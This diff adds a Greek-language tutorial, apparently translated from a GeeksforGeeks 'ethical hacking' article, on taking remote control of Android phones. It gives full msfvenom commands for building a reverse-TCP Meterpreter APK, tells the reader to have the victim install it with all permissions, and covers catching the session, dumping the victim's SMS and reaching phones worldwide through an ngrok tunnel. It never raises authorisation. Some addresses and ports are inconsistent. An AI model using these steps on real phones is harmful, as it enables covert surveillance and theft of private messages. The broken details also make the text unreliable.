@@ -1,0 +1,118 @@
+# Απομακρυσμένη Πρόσβαση στο Ethical Hacking
+
+---
+
+Η απομακρυσμένη πρόσβαση είναι μια ευπάθεια μέσω της οποίας οι επιτιθέμενοι μπορούν να ελέγχουν οποιαδήποτε συσκευή. Συνήθως χρησιμοποιούνται **payloads** για τον απομακρυσμένο έλεγχο. Τα payloads αποστέλλονται μέσω **κοινωνικής μηχανικής** ή **phishing επιθέσεων**. Μόλις το payload εισαχθεί, ξεκινά η πραγματική επίθεση. Το payload παρέχει μια αντίστροφη σύνδεση.  
+
+Συχνά χρησιμοποιείται το **Metasploit Framework** για τη δημιουργία payloads. Υπάρχουν τρεις διαφορετικοί τύποι modules payload στο Metasploit Framework:
+
+- Singles  
+- Stagers  
+- Stages  
+
+![Phishing Attack Structure](https://media.geeksforgeeks.org/wp-content/uploads/20220626093450/drawremotegeekstogeek.png)
+
+Ας δούμε πώς μπορούμε να εκμεταλλευτούμε και να αποκτήσουμε απομακρυσμένη πρόσβαση σε μια συσκευή Android χρησιμοποιώντας το Metasploit. Στο Android, χρειαζόμαστε **Termux** για να τρέξουμε το Metasploit. Μετά την εγκατάσταση του Termux, πρέπει να εγκαταστήσουμε το **Metasploit Framework**.
+
+![Termux](https://media.geeksforgeeks.org/wp-content/uploads/20220628112040/geekstermux1.png)
+
+Μετά την εγκατάσταση του Metasploit Framework, τρέξτε:
+
+```bash
+pkg update && pkg upgrade
+termux-setup-storage
+```
+
+Η εντολή `termux-setup-storage` δίνει άδεια αποθήκευσης στο Termux ώστε να αποθηκεύονται τα payloads ή να τα αντιγράψουμε στο κινητό. Χρησιμοποιώντας την εντολή `ls` μπορούμε να δούμε τον κατάλογο **storage**.
+
+### Βασικές εντολές:
+
+```bash
+$ pkg update && pkg upgrade
+$ termux-setup-storage
+```
+
+Μπορούμε να δημιουργήσουμε διάφορους τύπους payloads ανάλογα με τις ανάγκες. Ας δημιουργήσουμε ένα payload για πρόσβαση σε συσκευή που βρίσκεται στο ίδιο δίκτυο (το ίδιο δίκτυο αναφέρεται σε συσκευές συνδεδεμένες μεταξύ τους, είτε απευθείας είτε μέσω mobile hotspot). Το payload θα ονομαστεί **Geeks.apk**.
+
+Η δημιουργία του payload γίνεται με την εντολή `msfvenom`. Το `lhost` είναι η IP σας (`ifconfig` για να τη βρείτε) και το `lport` είναι η θύρα.
+
+```bash
+$ msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.60.255 lport=5321 R> Geeks.apk
+```
+
+Μετά τη δημιουργία του payload, αντιγράψτε το στο storage:
+
+```bash
+$ cp Geeks.apk storage
+$ cd storage
+$ ls
+```
+
+Κατεβάστε το **Geeks.apk** στη συσκευή και δώστε όλες τις άδειες. Αυτό θα παρέχει αντίστροφη σύνδεση με τον host.
+
+Για να εκμεταλλευτούμε τη συσκευή, τρέξτε το `msfconsole` και εισάγετε:
+
+```bash
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload android/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST your_ip
+msf6 exploit(multi/handler) > set LPORT your_port
+msf6 exploit(multi/handler) > exploit
+```
+
+**Σημείωση:** Εισάγετε το ίδιο `lhost` και `lport` που χρησιμοποιήσατε για τη δημιουργία του payload.
+
+![Meterpreter Session](https://media.geeksforgeeks.org/wp-content/uploads/20220626112107/atermuxpay.jpeg)
+
+Μόλις αποκτήσουμε **meterpreter session** (αντίστροφη σύνδεση), μπορούμε να τρέξουμε την εντολή `help` για να δούμε τι μπορούμε να κάνουμε. Για παράδειγμα, για να πάρουμε τα μηνύματα SMS από τη συσκευή θύμα:
+
+```bash
+dump_sms $HOME
+$ mv sms_file_name storage
+$ cd storage
+$ mv sms_file_name downloads
+```
+
+Μπορούμε πλέον να διαβάσουμε τα SMS από τον κατάλογο **downloads**.
+
+![Exploit SMS](https://media.geeksforgeeks.org/wp-content/uploads/20220628113304/aexploit1.png)
+
+Η απομακρυσμένη πρόσβαση οδηγεί σε απώλεια εμπιστευτικότητας. Ένας επιτιθέμενος μπορεί να κάνει οτιδήποτε θέλει. Στο παράδειγμά μας, αυτό γίνεται σε localhost.
+
+Για εκμετάλλευση συσκευής οπουδήποτε στον κόσμο, χρειάζεται **ngrok**. Κατεβάστε ngrok για Linux και μετακινήστε το στο home directory:
+
+```bash
+$ cd storage
+$ cd downloads
+$ mv ngrok $HOME
+$ chmod +x ngrok
+```
+
+Στις περισσότερες περιπτώσεις, το ngrok δεν τρέχει σε κανονικό περιβάλλον, οπότε χρειάζεται Ubuntu ή άλλο εξωτερικό OS (π.χ. μέσω AnLinux app). Μετά την εγκατάσταση, εισάγετε το auth token:
+
+```bash
+$ ./ngrok config add-authtoken <token>
+$ ./ngrok tcp 5431
+```
+
+Το payload δημιουργείται όπως προηγουμένως, αλλά με **LHOST** και **LPORT** από το ngrok:
+
+```bash
+$ msfvenom -p android/meterpreter/reverse_tcp lhost=6.tcp.ngrok.io lport=16960 R> Geeks.apk
+```
+
+Αντιγράψτε το payload στη συσκευή θύμα και τρέξτε το `msfconsole`:
+
+```bash
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload android/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 0.0.0.0
+msf6 exploit(multi/handler) > set LPORT 5544
+msf6 exploit(multi/handler) > exploit
+```
+
+Τώρα αποκτάμε πλήρη πρόσβαση στη συσκευή θύμα. Υπάρχουν πολλοί τρόποι για να αποκτήσει κάποιος απομακρυσμένη πρόσβαση. Συνήθως δημιουργούνται **backdoors** για παραμονή στη συσκευή θύμα. Το payload είναι ένας τύπος backdoor μέσω του οποίου εκμεταλλευτήκαμε τη συσκευή.
+
+![Remote Access Overview](https://media.geeksforgeeks.org/wp-content/uploads/20220626193023/draw2.png)
+
+**Tags:** [Ethical Hacking](https://www.geeksforgeeks.org/category/ethical-hacking/)
